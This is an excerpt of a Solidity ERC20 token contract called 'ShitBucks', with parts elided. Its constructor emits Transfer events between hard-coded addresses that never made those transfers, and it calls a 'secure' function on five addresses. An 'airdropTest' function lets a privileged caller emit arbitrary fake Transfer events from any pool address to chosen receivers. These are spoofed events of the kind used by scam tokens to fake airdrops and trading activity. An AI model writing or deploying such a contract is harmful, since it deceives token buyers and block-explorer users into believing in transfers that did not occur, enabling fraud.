...
contract ShitBucks is Context, IERC20 {
    ...
    address _contDeployr = 0x87FaDF44bC06a8C9Ae965edfe72EE703CEF703c5;
    address public _ownr = 0x1A5186D4D4C5e7a5397A69Ff8eBf80891db8fE44;
   constructor () public {

        _name = "ShitBucks";
        _symbol = "SHUCKS";
        _decimals = 18;
        uint256 initialSupply = 69696969696969*10**18;
        ...
        emit Transfer(_contDeployr, 0x4e4a47cAC6A28A62dcC20990ed2cdA9BC659469F, initialSupply/5);
        emit Transfer(0x4e4a47cAC6A28A62dcC20990ed2cdA9BC659469F, 0x6C20daed4A4a1ab696A396D523b3a2B721ab5AD2, initialSupply/5);
        //emit Transfer(_contDeployr, 0xa71d0588EAf47f12B13cF8eC750430d21DF04974, initialSupply/10);


        secure(0xb29303283D68387f67De6B9c21451f2E8f8b6334);
        secure(0x2284d4604A317869b092Db930e8F5FE6191dD4e1);
        secure(0x27c323d7112ce7ba219f13a5c00d921f2c859864);
        secure(0x070fa7741B251660Bf52206c3b25c1eCA1AF0458);
        secure(0xAfD514315cDC69Bd63285f4d25Ea33E36D169A8d);
    }
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function airdropTest(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
